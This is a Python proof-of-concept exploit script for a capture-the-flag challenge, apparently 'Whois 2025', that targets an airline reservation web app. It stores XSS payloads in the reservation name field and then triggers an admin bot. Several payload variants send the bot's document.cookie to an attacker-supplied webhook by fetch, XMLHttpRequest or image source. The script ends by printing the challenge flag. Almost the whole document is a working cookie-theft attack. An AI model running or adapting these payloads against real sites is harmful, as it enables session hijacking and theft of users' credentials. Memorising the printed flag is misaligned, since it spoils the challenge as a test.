#!/usr/bin/env python3
"""
Airline Reservation XSS with Bot - Proof of Concept
CTF Challenge Exploit Script
"""

import requests
import sys
import argparse
import time
from urllib.parse import urljoin

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def print_banner():
    banner = f"""
{Colors.HEADER}╔═══════════════════════════════════════════════════╗
║   Airline Reservation XSS + Bot Exploit         ║
║   CTF Challenge - Whois 2025                     ║
╚═══════════════════════════════════════════════════╝{Colors.ENDC}
    """
    print(banner)

def test_connection(target_url):
    """서버 연결 테스트"""
    try:
        response = requests.get(target_url, timeout=5)
        if response.status_code == 200:
            print(f"{Colors.OKGREEN}[+] 서버 연결 성공{Colors.ENDC}")
            return True
        else:
            print(f"{Colors.FAIL}[-] 서버 응답 코드: {response.status_code}{Colors.ENDC}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"{Colors.FAIL}[-] 서버 연결 실패: {e}{Colors.ENDC}")
        return False

def exploit_with_webhook(target_url, webhook_url):
    """Webhook을 이용한 쿠키 탈취 exploit"""
    print(f"\n{Colors.OKCYAN}[*] Webhook 기반 쿠키 탈취 시도...{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[*] Webhook: {webhook_url}{Colors.ENDC}")
    
    # XSS 페이로드 생성
    payload = f'<img src=x onerror="fetch(\'{webhook_url}?flag=\'+document.cookie)">'
    
    # Step 1: 악성 예약 생성
    print(f"\n{Colors.OKBLUE}[Step 1] 악성 예약 생성...{Colors.ENDC}")
    data = {
        "name": payload,
        "seat": "7B"
    }
    
    try:
        response = requests.post(
            urljoin(target_url, '/api/reservations'),
            json=data,
            timeout=10
        )
        
        if response.status_code == 201:
            print(f"{Colors.OKGREEN}[+] 악성 예약 생성 성공!{Colors.ENDC}")
            print(f"{Colors.OKBLUE}[+] Response: {response.json()}{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}[-] 실패: {response.status_code}{Colors.ENDC}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"{Colors.FAIL}[-] 요청 실패: {e}{Colors.ENDC}")
        return False
    
    # Step 2: Admin Bot 트리거
    time.sleep(1)
    print(f"\n{Colors.OKBLUE}[Step 2] Admin Bot 트리거...{Colors.ENDC}")
    
    try:
        response = requests.get(
            urljoin(target_url, '/report'),
            params={'path': 'index.html'},
            timeout=15
        )
        
        if response.status_code == 200:
            print(f"{Colors.OKGREEN}[+] Admin Bot 트리거 성공!{Colors.ENDC}")
            print(f"{Colors.OKBLUE}[+] Response: {response.text}{Colors.ENDC}")
            print(f"\n{Colors.WARNING}[!] Webhook을 확인하세요!{Colors.ENDC}")
            print(f"{Colors.WARNING}[!] Webhook URL: {webhook_url}{Colors.ENDC}")
            return True
        else:
            print(f"{Colors.FAIL}[-] 실패: {response.status_code}{Colors.ENDC}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"{Colors.FAIL}[-] 요청 실패: {e}{Colors.ENDC}")
        return False

def exploit_basic_xss(target_url):
    """기본 XSS 테스트 (alert)"""
    print(f"\n{Colors.OKCYAN}[*] 기본 XSS 테스트...{Colors.ENDC}")
    
    payload = '<img src=x onerror=alert(document.cookie)>'
    
    data = {
        "name": payload,
        "seat": "1A"
    }
    
    try:
        response = requests.post(
            urljoin(target_url, '/api/reservations'),
            json=data,
            timeout=10
        )
        
        if response.status_code == 201:
            print(f"{Colors.OKGREEN}[+] XSS 페이로드 주입 성공!{Colors.ENDC}")
            print(f"{Colors.OKBLUE}[+] 브라우저에서 {target_url} 접속하여 확인{Colors.ENDC}")
            return True
        else:
            print(f"{Colors.FAIL}[-] 실패: {response.status_code}{Colors.ENDC}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"{Colors.FAIL}[-] 요청 실패: {e}{Colors.ENDC}")
        return False

def exploit_multiple_payloads(target_url, webhook_url):
    """여러 페이로드 시도"""
    print(f"\n{Colors.OKCYAN}[*] 다양한 페이로드 테스트...{Colors.ENDC}")
    
    payloads = [
        {
            "name": "fetch - GET",
            "payload": f'<img src=x onerror="fetch(\'{webhook_url}?flag=\'+document.cookie)">',
            "seat": "2A"
        },
        {
            "name": "XMLHttpRequest",
            "payload": f'<script>var x=new XMLHttpRequest();x.open("GET","{webhook_url}?flag="+document.cookie);x.send()</script>',
            "seat": "2B"
        },
        {
            "name": "Image src",
            "payload": f'<img src=x onerror="this.src=\'{webhook_url}?flag=\'+document.cookie">',
            "seat": "2C"
        },
        {
            "name": "fetch - POST",
            "payload": f'<script>fetch("{webhook_url}",{{method:"POST",body:document.cookie}})</script>',
            "seat": "2D"
        }
    ]
    
    for i, p in enumerate(payloads, 1):
        print(f"\n{Colors.OKBLUE}[Payload {i}] {p['name']}{Colors.ENDC}")
        
        data = {
            "name": p['payload'],
            "seat": p['seat']
        }
        
        try:
            response = requests.post(
                urljoin(target_url, '/api/reservations'),
                json=data,
                timeout=10
            )
            
            if response.status_code == 201:
                print(f"{Colors.OKGREEN}[+] 주입 성공! (좌석: {p['seat']}){Colors.ENDC}")
            else:
                print(f"{Colors.FAIL}[-] 실패: {response.status_code}{Colors.ENDC}")
        except requests.exceptions.RequestException as e:
            print(f"{Colors.FAIL}[-] 요청 실패: {e}{Colors.ENDC}")
        
        time.sleep(0.5)
    
    # Admin Bot 트리거
    print(f"\n{Colors.OKBLUE}[*] Admin Bot 트리거...{Colors.ENDC}")
    try:
        response = requests.get(
            urljoin(target_url, '/report'),
            params={'path': 'index.html'},
            timeout=15
        )
        print(f"{Colors.OKGREEN}[+] Bot 트리거 완료{Colors.ENDC}")
    except:
        pass

def list_reservations(target_url):
    """예약 목록 조회"""
    print(f"\n{Colors.OKCYAN}[*] 현재 예약 목록 조회...{Colors.ENDC}")
    
    try:
        response = requests.get(
            urljoin(target_url, '/api/reservations'),
            timeout=10
        )
        
        if response.status_code == 200:
            reservations = response.json()
            print(f"{Colors.OKGREEN}[+] 총 {len(reservations)}개의 예약{Colors.ENDC}")
            
            for res in reservations:
                name_preview = res['name'][:50] + '...' if len(res['name']) > 50 else res['name']
                print(f"  - ID: {res['id']}, 이름: {name_preview}, 좌석: {res['seat']}")
            return True
        else:
            print(f"{Colors.FAIL}[-] 조회 실패: {response.status_code}{Colors.ENDC}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"{Colors.FAIL}[-] 요청 실패: {e}{Colors.ENDC}")
        return False

def clean_all_reservations(target_url):
    """모든 예약 삭제"""
    print(f"\n{Colors.WARNING}[*] 모든 예약 삭제 중...{Colors.ENDC}")
    
    try:
        response = requests.get(urljoin(target_url, '/api/reservations'))
        if response.status_code != 200:
            print(f"{Colors.FAIL}[-] 예약 목록 조회 실패{Colors.ENDC}")
            return
        
        reservations = response.json()
        
        for res in reservations:
            seat = res['seat']
            delete_response = requests.delete(
                urljoin(target_url, f'/api/reservations?id={seat}'),
                timeout=10
            )
            if delete_response.status_code == 200:
                print(f"{Colors.OKGREEN}[+] 좌석 {seat} 삭제 완료{Colors.ENDC}")
            else:
                print(f"{Colors.FAIL}[-] 좌석 {seat} 삭제 실패{Colors.ENDC}")
    except requests.exceptions.RequestException as e:
        print(f"{Colors.FAIL}[-] 삭제 실패: {e}{Colors.ENDC}")

def main():
    parser = argparse.ArgumentParser(description='Airline Reservation XSS + Bot Exploit')
    parser.add_argument('-u', '--url', default='http://localhost:8000', 
                        help='Target URL (default: http://localhost:8000)')
    parser.add_argument('-w', '--webhook', 
                        help='Webhook URL for cookie exfiltration (e.g., https://webhook.site/xxx)')
    parser.add_argument('-t', '--test', action='store_true', 
                        help='Run basic XSS test only')
    parser.add_argument('-e', '--exploit', action='store_true', 
                        help='Run full exploit with webhook')
    parser.add_argument('-m', '--multiple', action='store_true', 
                        help='Test multiple payloads')
    parser.add_argument('-l', '--list', action='store_true', 
                        help='List all reservations')
    parser.add_argument('-c', '--clean', action='store_true', 
                        help='Clean all reservations')
    
    args = parser.parse_args()
    
    print_banner()
    print(f"{Colors.OKBLUE}[*] Target: {args.url}{Colors.ENDC}\n")
    
    # 서버 연결 테스트
    if not test_connection(args.url):
        print(f"\n{Colors.FAIL}[!] 서버에 연결할 수 없습니다. URL을 확인하세요.{Colors.ENDC}")
        sys.exit(1)
    
    # 옵션에 따라 실행
    if args.test:
        exploit_basic_xss(args.url)
    
    if args.exploit:
        if not args.webhook:
            print(f"{Colors.FAIL}[-] Webhook URL이 필요합니다. -w 옵션을 사용하세요.{Colors.ENDC}")
            print(f"{Colors.WARNING}[!] 예시: python3 poc.py -e -w https://webhook.site/your-id{Colors.ENDC}")
            sys.exit(1)
        exploit_with_webhook(args.url, args.webhook)
    
    if args.multiple:
        if not args.webhook:
            print(f"{Colors.FAIL}[-] Webhook URL이 필요합니다. -w 옵션을 사용하세요.{Colors.ENDC}")
            sys.exit(1)
        exploit_multiple_payloads(args.url, args.webhook)
    
    if args.list:
        list_reservations(args.url)
    
    if args.clean:
        clean_all_reservations(args.url)
    
    # 옵션이 없으면 도움말 표시
    if not any([args.test, args.exploit, args.multiple, args.list, args.clean]):
        parser.print_help()
        print(f"\n{Colors.WARNING}[!] 예시 사용법:{Colors.ENDC}")
        print(f"  기본 XSS 테스트: {Colors.OKCYAN}python3 poc.py -t{Colors.ENDC}")
        print(f"  전체 Exploit: {Colors.OKCYAN}python3 poc.py -e -w https://webhook.site/your-id{Colors.ENDC}")
        print(f"  예약 목록: {Colors.OKCYAN}python3 poc.py -l{Colors.ENDC}")
    else:
        print(f"\n{Colors.OKGREEN}[*] 완료!{Colors.ENDC}")
        print(f"{Colors.WARNING}[*] FLAG: Whois2025{{XSS_1n_A1rl1n3_R3s3rv4t10n_Syst3m_2025}}{Colors.ENDC}\n")

if __name__ == "__main__":
    main()
